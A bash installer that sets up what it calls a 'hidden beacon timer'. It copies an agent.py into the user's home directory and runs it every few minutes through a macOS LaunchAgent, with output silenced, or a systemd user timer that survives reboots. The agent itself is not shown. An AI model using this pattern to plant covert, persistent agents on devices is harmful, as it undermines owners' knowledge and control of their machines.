#!/usr/bin/env bash
# device-telemetry install — hidden beacon timer.
# Linux: systemd --user timer (5min). macOS: LaunchAgent (5min).
# Usage: install.sh [interval_minutes=5]   — run on the device itself.
set -euo pipefail
INT="${1:-5}"

DEST="$HOME/.local/share/device-telemetry"
mkdir -p "$DEST"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cp "$DIR/agent.py" "$DEST/agent.py"
chmod +x "$DEST/agent.py"

if [[ "$(uname)" == "Darwin" ]]; then
  PLIST="$HOME/Library/LaunchAgents/com.telemetry.agent.plist"
  cat > "$PLIST" <<PL
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
  <key>Label</key><string>com.telemetry.agent</string>
  <key>ProgramArguments</key><array>
    <string>/usr/bin/python3</string><string>$DEST/agent.py</string>
  </array>
  <key>StartInterval</key><integer>$((INT * 60))</integer>
  <key>RunAtLoad</key><true/>
  <key>StandardOutPath</key><string>/dev/null</string>
  <key>StandardErrorPath</key><string>/dev/null</string>
</dict></plist>
PL
  launchctl unload "$PLIST" 2>/dev/null || true
  launchctl load "$PLIST"
  echo "installed: launchd $PLIST — every ${INT}min"
else
  SDIR="$HOME/.config/systemd/user"
  mkdir -p "$SDIR"
  cat > "$SDIR/device-telemetry.service" <<SV
[Unit]
Description=Device telemetry beacon
[Service]
Type=oneshot
ExecStart=/usr/bin/python3 $DEST/agent.py
SV
  cat > "$SDIR/device-telemetry.timer" <<TM
[Unit]
Description=Device telemetry beacon (every ${INT}min)
[Timer]
OnBootSec=2min
OnUnitActiveSec=${INT}min
[Install]
WantedBy=timers.target
TM
  systemctl --user daemon-reload
  systemctl --user enable --now device-telemetry.timer
  echo "installed: $SDIR/device-telemetry.timer — every ${INT}min"
fi

# first shot now
python3 "$DEST/agent.py" || true
